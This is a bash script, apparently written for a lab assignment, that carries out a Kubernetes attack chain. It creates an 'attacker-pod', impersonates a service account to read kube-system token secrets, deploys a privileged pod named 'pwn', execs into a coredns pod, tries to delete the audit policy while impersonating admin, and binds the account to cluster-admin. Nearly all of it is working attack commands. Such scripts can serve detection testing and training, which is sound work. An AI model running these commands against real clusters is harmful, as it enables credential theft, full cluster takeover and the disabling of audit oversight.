#!/usr/bin/env bash
set -euo pipefail

kubectl create ns secure-ops || true
kubectl config set-context --current --namespace=secure-ops

kubectl create sa monitoring || true
kubectl run attacker-pod --image=alpine --command -- sleep 3600 || true
kubectl auth can-i get secrets --as=system:serviceaccount:secure-ops:monitoring

# Try to read a kube-system secret as that SA (should be denied in a hardened cluster; in labs it may succeed)
SECRET_NAME=$(kubectl get secrets -n kube-system | grep default-token | head -n1 | awk '{print $1}' || true)
if [ -n "${SECRET_NAME:-}" ]; then
  kubectl get secret -n kube-system "$SECRET_NAME" --as=system:serviceaccount:secure-ops:monitoring || true
fi

cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: pwn
    image: alpine
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
  restartPolicy: Never
EOF

# exec into a kube-system pod (coredns)
COREDNS_POD=$(kubectl get pods -n kube-system | grep coredns | awk '{print $1}' | head -n1 || true)
if [ -n "${COREDNS_POD:-}" ]; then
  kubectl exec -n kube-system "$COREDNS_POD" -- cat /etc/resolv.conf || true
fi

# Attempt to delete audit-policy (this path is typically on node; we simulate via kubectl delete -f)
# In real incident, attacker may tamper with policy file on node; kubectl delete -f is included per assignment.
kubectl delete -f /etc/kubernetes/audit-policy.yaml --as=admin || true

cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: escalate-binding
subjects:
- kind: ServiceAccount
  name: monitoring
  namespace: secure-ops
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF
